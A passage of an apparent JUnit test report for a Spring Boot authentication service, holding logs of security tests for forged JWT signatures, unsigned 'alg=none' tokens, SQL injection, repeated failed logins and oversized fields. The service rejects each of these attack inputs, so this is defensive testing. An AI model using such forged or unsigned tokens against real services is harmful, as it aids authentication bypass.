  modulus: 23219532989027316059913130072036011577642447658723837585415828320564880655801685129968426233723415499526697296728769962008696887608316675981916516337222214248346064240959074266852013591385415145048770301485256825441242141770408913330560594712539959340431231719415896516084613028247977178503006245720253072423507203253233799618168557902423674880549231195152550485360484716883337011594633945125485462642043748911693813238113131776401647260158419955314863663860979932798742161218967980454483659030479304740556586686587381743533373672386721817273436642168316380717704052965945146538941048432228775572395018564362456690241
  public exponent: 65537}: Signature callback execution failed: Bad signature length: got 260 but was expecting 256
17:10:32.267 [http-nio-auto-4-exec-9] DEBUG m.c.q.s.s.JwtAuthenticationFilter - Token inválido o expirado para request: /seguridad/v1/api/auth/validate
17:10:32.267 [http-nio-auto-4-exec-9] WARN  m.c.q.s.security.JwtExceptionHandler - Error de autenticación para /seguridad/v1/api/auth/validate: Full authentication is required to access this resource
17:10:32.273 [http-nio-auto-4-exec-10] DEBUG m.c.q.seguridad.service.AuthService - Token inválido: JWT signature does not match locally computed signature. JWT validity cannot be asserted and should not be trusted.
17:10:32.274 [http-nio-auto-4-exec-10] DEBUG m.c.q.s.s.JwtAuthenticationFilter - Token inválido o expirado para request: /seguridad/v1/api/auth/validate
17:10:32.274 [http-nio-auto-4-exec-10] WARN  m.c.q.s.security.JwtExceptionHandler - Error de autenticación para /seguridad/v1/api/auth/validate: Full authentication is required to access this resource
]]></system-out>
  </testcase>
  <testcase name="shouldRejectNoneAlgorithmTokens" classname="mx.com.qtx.seguridad.security.SecurityAttackProtectionTest" time="0.01">
    <system-out><![CDATA[17:10:32.282 [http-nio-auto-4-exec-1] ERROR m.c.qtx.seguridad.service.JwtService - Token JWT no soportado: Unsecured JWSs (those with an 'alg' (Algorithm) header value of 'none') are disallowed by default as mandated by https://www.rfc-editor.org/rfc/rfc7518.html#section-3.6. If you wish to allow them to be parsed, call the JwtParserBuilder.unsecured() method, but please read the security considerations covered in that method's JavaDoc before doing so. Header: {typ=JWT, alg=none}
17:10:32.283 [http-nio-auto-4-exec-1] DEBUG m.c.q.seguridad.service.AuthService - Token inválido: Unsecured JWSs (those with an 'alg' (Algorithm) header value of 'none') are disallowed by default as mandated by https://www.rfc-editor.org/rfc/rfc7518.html#section-3.6. If you wish to allow them to be parsed, call the JwtParserBuilder.unsecured() method, but please read the security considerations covered in that method's JavaDoc before doing so. Header: {typ=JWT, alg=none}
17:10:32.284 [http-nio-auto-4-exec-1] DEBUG m.c.q.s.s.JwtAuthenticationFilter - Token inválido o expirado para request: /seguridad/v1/api/auth/validate
17:10:32.284 [http-nio-auto-4-exec-1] WARN  m.c.q.s.security.JwtExceptionHandler - Error de autenticación para /seguridad/v1/api/auth/validate: Full authentication is required to access this resource
]]></system-out>
  </testcase>
  <testcase name="shouldPreventSqlInjectionInPassword" classname="mx.com.qtx.seguridad.security.SecurityAttackProtectionTest" time="0.839">
    <system-out><![CDATA[17:10:32.295 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:32.296 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:32.578 [http-nio-auto-4-exec-2] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:32.579 [http-nio-auto-4-exec-2] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:32.585 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:32.586 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:32.853 [http-nio-auto-4-exec-3] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:32.854 [http-nio-auto-4-exec-3] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:32.861 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:32.862 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:33.122 [http-nio-auto-4-exec-4] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:33.122 [http-nio-auto-4-exec-4] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
]]></system-out>
  </testcase>
  <testcase name="shouldHandleMultipleFailedLoginAttempts" classname="mx.com.qtx.seguridad.security.SecurityAttackProtectionTest" time="2.993">
    <system-out><![CDATA[17:10:33.133 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:33.135 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:33.407 [http-nio-auto-4-exec-5] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:33.407 [http-nio-auto-4-exec-5] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:33.415 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:33.416 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:33.679 [http-nio-auto-4-exec-6] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:33.679 [http-nio-auto-4-exec-6] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:33.685 [http-nio-auto-4-exec-7] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:33.687 [http-nio-auto-4-exec-7] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:33.951 [http-nio-auto-4-exec-7] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:33.951 [http-nio-auto-4-exec-7] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:33.958 [http-nio-auto-4-exec-8] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:33.960 [http-nio-auto-4-exec-8] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:34.221 [http-nio-auto-4-exec-8] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:34.222 [http-nio-auto-4-exec-8] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:34.228 [http-nio-auto-4-exec-9] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:34.230 [http-nio-auto-4-exec-9] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:34.491 [http-nio-auto-4-exec-9] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:34.491 [http-nio-auto-4-exec-9] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:34.498 [http-nio-auto-4-exec-10] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:34.499 [http-nio-auto-4-exec-10] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:34.761 [http-nio-auto-4-exec-10] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:34.761 [http-nio-auto-4-exec-10] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:34.768 [http-nio-auto-4-exec-1] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:34.770 [http-nio-auto-4-exec-1] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:35.027 [http-nio-auto-4-exec-1] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:35.028 [http-nio-auto-4-exec-1] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:35.035 [http-nio-auto-4-exec-2] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:35.036 [http-nio-auto-4-exec-2] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:35.295 [http-nio-auto-4-exec-2] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:35.295 [http-nio-auto-4-exec-2] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:35.303 [http-nio-auto-4-exec-3] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:35.304 [http-nio-auto-4-exec-3] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:35.567 [http-nio-auto-4-exec-3] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:35.567 [http-nio-auto-4-exec-3] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:35.574 [http-nio-auto-4-exec-4] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:35.575 [http-nio-auto-4-exec-4] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:35.843 [http-nio-auto-4-exec-4] WARN  m.c.q.seguridad.service.AuthService - Contraseña incorrecta para usuario: admin
17:10:35.844 [http-nio-auto-4-exec-4] ERROR m.c.q.seguridad.service.AuthService - Error de autenticación para usuario admin: Credenciales inválidas
17:10:35.850 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:35.851 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.111 [http-nio-auto-4-exec-5] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:36.113 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:36.113 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:36 MST 2025, expiration: Wed Jul 02 18:10:36 MST 2025
17:10:36.114 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:36.116 [http-nio-auto-4-exec-5] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:36.116 [http-nio-auto-4-exec-5] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
]]></system-out>
  </testcase>
  <testcase name="shouldHandleAuthenticationTimeout" classname="mx.com.qtx.seguridad.security.SecurityAttackProtectionTest" time="0.284">
    <system-out><![CDATA[17:10:36.127 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Intento de autenticación para usuario: admin
17:10:36.129 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* <criteria> */ select
        u1_0.id,
        u1_0.activo,
        u1_0.fecha_creacion,
        u1_0.fecha_modificacion,
        u1_0.password,
        u1_0.usuario 
    from
        usuario u1_0 
    where
        u1_0.usuario=? 
        and u1_0.activo=?
17:10:36.396 [http-nio-auto-4-exec-6] DEBUG org.hibernate.SQL - 
    /* SELECT
        ra 
    FROM
        RolAsignado ra 
    JOIN
        
    FETCH
        ra.rol r 
    WHERE
        ra.usuario.id = :usuarioId 
        AND ra.activo = true 
        AND r.activo = true */ select
            ra1_0.id_rol,
            ra1_0.id_usuario,
            ra1_0.activo,
            ra1_0.fecha_creacion,
            ra1_0.fecha_modificacion,
            r1_0.id,
            r1_0.activo,
            r1_0.fecha_creacion,
            r1_0.fecha_modificacion,
            r1_0.nombre 
        from
            rol_asignado ra1_0 
        join
            rol r1_0 
                on r1_0.id=ra1_0.id_rol 
        where
            ra1_0.id_usuario=? 
            and ra1_0.activo=1 
            and r1_0.activo=1
17:10:36.398 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Configuración JWT - accessTokenExpiration: 3600000 ms
17:10:36.398 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Token times - now: Wed Jul 02 17:10:36 MST 2025, expiration: Wed Jul 02 18:10:36 MST 2025
17:10:36.400 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Access token generado para usuario: admin con roles: [ADMIN]
17:10:36.401 [http-nio-auto-4-exec-6] DEBUG m.c.qtx.seguridad.service.JwtService - Refresh token generado para usuario: admin
17:10:36.401 [http-nio-auto-4-exec-6] INFO  m.c.q.seguridad.service.AuthService - Autenticación exitosa para usuario: admin con roles: [ADMIN]
]]></system-out>
  </testcase>
  <testcase name="shouldValidateMaxFieldLength" classname="mx.com.qtx.seguridad.security.SecurityAttackProtectionTest" time="0.016">
    <system-out><![CDATA[17:10:36.414 [http-nio-auto-4-exec-7] WARN  o.s.w.s.m.s.DefaultHandlerExceptionResolver - Resolved [org.springframework.web.bind.MethodArgumentNotValidException: Validation failed for argument [0] in public org.springframework.http.ResponseEntity<?> mx.com.qtx.seguridad.controller.AuthController.login(mx.com.qtx.seguridad.dto.LoginRequest) with 2 errors: [Field error in object 'loginRequest' on field 'password': rejected value [aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa